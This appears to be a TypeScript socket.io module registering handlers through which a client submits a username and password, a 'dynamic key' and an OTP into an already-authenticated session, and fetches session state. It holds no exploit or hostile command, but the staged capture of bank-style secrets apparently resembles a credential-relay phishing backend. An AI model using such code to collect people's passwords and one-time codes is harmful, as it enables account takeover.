import { Socket } from "socket.io";
import type { UserSubmitAuth } from "../../../../core/application/usecases/UserSubmitAuth.js";
import type { UserSubmitDinamic } from "../../../../core/application/usecases/UserSubmitDinamic.js";
import type { UserSubmitOtp } from "../../../../core/application/usecases/UserSubmitOtp.js";
import { UserGetSession } from "../../../../core/application/usecases/UserGetSession.js";

type AckGetSession = (res: {
  ok: boolean;
  session?: any;
  error?: string;
}) => void;
type Ack = (res: { ok: boolean; error?: string }) => void;

export function registerUserHandlers(
  socket: Socket,
  deps: {
    submitAuth: UserSubmitAuth;
    submitDinamic: UserSubmitDinamic;
    submitOtp: UserSubmitOtp;
    userGetSession: UserGetSession;
  }
) {
  socket.on("user:submit_auth", async (payload: any, ack?: Ack) => {
    const sessionId = socket.data.auth.sessionId; // ya autenticado
    const res = await deps.submitAuth.execute({
      sessionId,
      user: payload?.auth?.user ?? "",
      pass: payload?.auth?.pass ?? "",
    });
    ack?.(res);
  });

  socket.on("user:submit_dinamic", async (payload: any, ack?: Ack) => {
    const sessionId = socket.data.auth.sessionId;
    const res = await deps.submitDinamic.execute({
      sessionId,
      dinamic: payload?.auth?.dinamic ?? "",
    });
    ack?.(res);
  });

  socket.on("user:submit_otp", async (payload: any, ack?: Ack) => {
    const sessionId = socket.data.auth.sessionId;
    const res = await deps.submitOtp.execute({
      sessionId,
      otp: payload?.auth?.otp ?? "",
    });
    ack?.(res);
  });
  socket.on("user:get_session", async (ack?: AckGetSession) => {
    try {
      if (socket.data.auth?.role !== "user") {
        return ack?.({ ok: false, error: "forbidden_user" });
      }

      const sessionId = socket.data.auth.sessionId;
      const result = await deps.userGetSession.execute({ sessionId });

      // ✅ sincroniza por push también (recomendado)
      if (result.ok) {
        socket.emit("session:update", result.session);
        return ack?.({ ok: true, session: result.session });
      }

      return ack?.({ ok: false, error: result.error });
    } catch {
      return ack?.({ ok: false, error: "server_error" });
    }
  });
}
